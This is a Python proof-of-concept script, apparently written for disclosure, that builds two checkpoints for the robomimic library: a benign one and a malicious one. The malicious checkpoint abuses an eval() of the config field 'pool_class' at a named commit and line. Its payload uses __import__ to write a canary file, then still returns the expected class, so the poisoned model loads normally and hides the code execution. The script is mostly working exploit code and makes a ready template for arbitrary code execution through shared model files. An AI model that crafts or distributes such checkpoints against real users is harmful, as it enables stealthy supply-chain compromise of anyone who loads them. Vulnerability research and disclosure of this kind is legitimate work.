#!/usr/bin/env python3
"""
make_poc.py -- build the malicious and the negative-control robomimic checkpoint.

Target
------
ARISE-Initiative/robomimic @ d309eaecc18acf4152a830a895a6984b8ac71b05
robomimic/models/obs_core.py:121-122 (VisualCore.__init__)

    pool_kwargs = extract_class_init_kwargs_from_dict(cls=eval(pool_class), dic=pool_kwargs, copy=True)
    self.pool = eval(pool_class)(**pool_kwargs)

`pool_class` comes from config.observation.encoder.rgb.core_kwargs.pool_class, which is
restored verbatim from the JSON string embedded in a robomimic checkpoint
(FileUtils.config_from_checkpoint -> json.loads(ckpt_dict["config"])).

What this script does
---------------------
Both checkpoints are written through the *upstream* training-time writer,
robomimic.utils.train_utils.save_model():

    params = dict(model=model.serialize(), config=config.dump(), algo_name=...,
                  env_metadata=..., shape_metadata=..., variable_state=...)
    torch.save(params, ckpt_path)

The two artifacts are therefore produced by the official writer and differ in exactly
one JSON leaf: config.observation.encoder.rgb.core_kwargs.pool_class.

  ckpt/benign.pth     pool_class = "SpatialSoftmax"        (ordinary installed class name)
  ckpt/malicious.pth  pool_class = <PAYLOAD>               (same class, via eval'd expression)

The payload writes a canary file and then still evaluates to the SpatialSoftmax class,
so the rebuilt network is architecturally identical and the checkpoint's model state
still loads. This isolates the defect to the config string alone -- no .py file, no
plugin, no program sidecar is carried by the artifact.

The benign model object is reused to author the malicious checkpoint so that this script
never has to eval() the payload itself.
"""
import os
import sys

import torch

import robomimic.utils.obs_utils as ObsUtils
import robomimic.utils.train_utils as TrainUtils
from robomimic.algo import algo_factory
from robomimic.config import config_factory

# The single attacker-controlled config value. Kept byte-for-byte as verified.
PAYLOAD = "(__import__('pathlib').Path('/out/pwned_by_robomimic_pool_class').write_text('MBE2E-CANARY-robomimic-pool-class-v2' + chr(10)), SpatialSoftmax)[1]"

CKPT_DIR = "ckpt"
BENIGN = os.path.join(CKPT_DIR, "benign.pth")
MALICIOUS = os.path.join(CKPT_DIR, "malicious.pth")

# Minimal vision-based BC policy metadata (rgb observation, 7-DoF action).
SHAPE_META = {
    "all_shapes": {"agentview_image": [3, 84, 84]},
    "all_obs_keys": ["agentview_image"],
    "use_images": True,
    "use_depths": False,
    "ac_dim": 7,
}
AC_DIM = SHAPE_META["ac_dim"]


def make_config(pool_class):
    """Build the exact upstream BC config, changing only the pool_class string."""
    cfg = config_factory(algo_name="bc")
    with cfg.values_unlocked():
        cfg.train.cuda = False
        cfg.experiment.name = "pool_class_poc"
        cfg.observation.modalities.obs.rgb = ["agentview_image"]
        cfg.observation.modalities.obs.low_dim = []
        cfg.observation.modalities.obs.depth = []
        cfg.observation.modalities.obs.scan = []
        cfg.observation.encoder.rgb.core_class = "VisualCore"
        cfg.observation.encoder.rgb.core_kwargs.backbone_class = "ResNet18Conv"
        cfg.observation.encoder.rgb.core_kwargs.pool_class = pool_class
        cfg.observation.encoder.rgb.core_kwargs.pool_kwargs = dict()
        cfg.observation.encoder.rgb.core_kwargs.feature_dimension = 64
    return cfg


def main():
    os.makedirs(CKPT_DIR, exist_ok=True)

    benign_cfg = make_config("SpatialSoftmax")
    malicious_cfg = make_config(PAYLOAD)

    # Build the model once, from the benign config, so that the payload is never
    # evaluated while the artifacts are being authored.
    ObsUtils.initialize_obs_utils_with_config(benign_cfg)
    device = torch.device("cpu")
    model = algo_factory(
        "bc",
        benign_cfg,
        obs_key_shapes=SHAPE_META["all_shapes"],
        ac_dim=AC_DIM,
        device=device,
    )
    print("built reference policy:", type(model).__name__)

    # Both artifacts written by the official upstream writer.
    TrainUtils.save_model(model, benign_cfg, {}, SHAPE_META, BENIGN)
    TrainUtils.save_model(model, malicious_cfg, {}, SHAPE_META, MALICIOUS)

    for path, cfg in ((BENIGN, benign_cfg), (MALICIOUS, malicious_cfg)):
        size = os.path.getsize(path)
        pc = cfg.observation.encoder.rgb.core_kwargs.pool_class
        shown = pc if len(pc) <= 60 else pc[:57] + "..."
        print("wrote {:<22} {:>9} bytes  pool_class={}".format(path, size, shown))

    print("\nmalicious pool_class (verbatim):")
    print(PAYLOAD)
    return 0


if __name__ == "__main__":
    sys.exit(main())
